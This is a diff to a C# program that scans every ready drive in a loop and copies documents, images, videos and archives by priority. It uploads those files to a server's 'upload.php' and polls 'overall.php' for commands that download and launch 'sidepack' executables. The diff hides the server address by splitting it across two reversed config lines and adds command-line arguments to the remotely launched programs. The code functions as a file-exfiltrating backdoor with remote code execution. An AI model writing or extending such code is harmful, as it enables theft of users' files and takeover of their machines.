@@ -12,9 +12,9 @@ public class packRuntimeInformation
 }
 internal class Program
 {
-    private static Task Main(string[] args)
+    private static void Main(string[] args)
     {
-        string SaveRoot, classRegistered, version, packDownloadSite;
+        string SaveRoot, classRegistered, version, packDownloadSite, urlP1, urlP2;
         string[,] copyRoot = new string[600000, 2];
         bool[] registeredDrive = new bool[26];
         int fileCnt = 0;
@@ -23,13 +23,15 @@ internal class Program
         List<string> filePriority = new List<string> { ".xlsx", ".xls", ".pptx", ".ppt", ".png", ".jpg", ".mp4", ".ts", ".zip" };
         StreamReader configFile = new StreamReader("config.txt");
         SaveRoot = configFile.ReadLine();
-        classRegistered = configFile.ReadLine();
+        urlP1 = configFile.ReadLine();
+        urlP2 = configFile.ReadLine();
+        classRegistered = urlP2 + urlP1;
         version = configFile.ReadLine();
         packDownloadSite = configFile.ReadLine();
         configFile.Close();
         Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
 
-        if (!Directory.Exists(SaveRoot)) 
+        if (!Directory.Exists(SaveRoot))
         {
             Directory.CreateDirectory(SaveRoot);
         }
@@ -75,6 +77,7 @@ internal class Program
                     try
                     {
                         HttpClient client = new HttpClient(handler);
+                        client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
                         HttpResponseMessage res = client.PostAsync(classRegistered + "upload.php", content).Result;
                         Console.WriteLine(path + " succeed");
                     }
@@ -106,6 +109,7 @@ internal class Program
                 using (HttpClient client = new HttpClient())
                 {
                     var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "VALIDATE", "GTC Kaliumdichromat Project" } });
+                    client.DefaultRequestHeaders.UserAgent.ParseAdd("GTC Software Studio - ACE_Project (priority:00A) && Kaliumdichromat_Project (sub of ACE_Project)");
                     HttpResponseMessage response = client.PostAsync(classRegistered + "overall.php", content).Result;
                     // Console.WriteLine(response.Content.ReadAsStringAsync().Result);
                     string[] commands = response.Content.ReadAsStringAsync().Result.Split('\n');
@@ -201,7 +205,16 @@ internal class Program
                             {
                                 Directory.CreateDirectory("sidepacks");
                             }
-                            string packName = command.Substring(4).Trim();
+                            string packName = splited[1];
+                            string arg = "";
+                            if (splited.Length > 2)
+                            {
+                                for (int i = 2; i < splited.Length; i++)
+                                {
+                                    arg += splited[i];
+                                    arg += " ";
+                                }
+                            }
                             Console.WriteLine(packName);
                             if (!Directory.Exists(Path.Combine("sidepacks", packName)))
                             {
@@ -254,7 +267,7 @@ internal class Program
                                     Directory.Delete(Path.Combine("sidepacks", packName), true);
                                     continue;
                                 }
-                                
+
                             }
                             try
                             {
@@ -263,13 +276,14 @@ internal class Program
                                 p.StartInfo.FileName = packInfo.exe;
                                 p.StartInfo.UseShellExecute = true;
                                 p.StartInfo.CreateNoWindow = false;
+                                p.StartInfo.Arguments = arg;
                                 p.Start();
                             }
                             catch (Exception e)
                             {
                                 Console.WriteLine(e.ToString());
                             }
-                            
+
                         }
                     }
                 }
@@ -298,12 +312,13 @@ internal class Program
                 copyRoot[fileCnt, 1] = localSaveRoot + file.FullName.Substring(3);
             }
         }
-
+        
 
         DriveInfo[] allDrivesG = DriveInfo.GetDrives();
         Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
         Console.OutputEncoding = Encoding.Unicode;
-
+        
+        
         foreach (DriveInfo item in allDrivesG)
         {
             if (item.IsReady)
@@ -319,7 +334,7 @@ internal class Program
         foreach (bool n in registeredDrive)
         { Console.WriteLine(n); }
 
-
+        
         while (true)
         {
             DriveInfo[] allDrives = DriveInfo.GetDrives();
@@ -391,7 +406,10 @@ internal class Program
             allDrives = null;
             visited = null;
             Thread.Sleep(1000);
+        
         }
+        
+        
     }
 
 }
